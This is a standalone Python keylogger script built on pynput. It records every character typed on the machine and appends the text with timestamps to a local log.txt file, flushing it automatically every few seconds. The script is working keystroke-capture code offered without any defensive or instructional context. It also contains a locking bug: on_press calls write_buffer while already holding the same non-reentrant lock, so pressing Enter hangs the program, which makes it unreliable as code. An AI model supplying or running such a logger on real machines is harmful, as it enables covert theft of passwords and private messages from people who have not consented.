from pynput.keyboard import Listener, Key
import datetime, threading

buffer = []
lock = threading.Lock()

def write_buffer(final=False):
    """Write buffer to file. If final=True, mark as complete line."""
    global buffer
    with lock:
        if buffer:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            text = ''.join(buffer)
            with open("log.txt", "a") as f:
                if final:
                    f.write(f"[{timestamp}] {text}\n")
                else:
                    f.write(f"[{timestamp}] [IN-PROGRESS] {text}\n")
            buffer.clear()

def auto_flush(interval=5):
    """Flush buffer every `interval` seconds automatically."""
    while True:
        write_buffer(final=False)
        threading.Event().wait(interval)

def on_press(key):
    global buffer
    try:
        with lock:
            if key == Key.space:
                buffer.append(" ")
            elif key == Key.enter:
                write_buffer(final=True)  # commit full line
            elif key == Key.backspace:
                if buffer:
                    buffer.pop()
            elif hasattr(key, 'char') and key.char is not None:
                buffer.append(key.char)
            else:
                # ignore modifier keys like shift, ctrl, alt
                pass
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        write_buffer(final=True)  # flush remaining buffer before exit
        return False

# Start auto-flush thread
threading.Thread(target=auto_flush, daemon=True).start()

# Start keyboard listener
with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()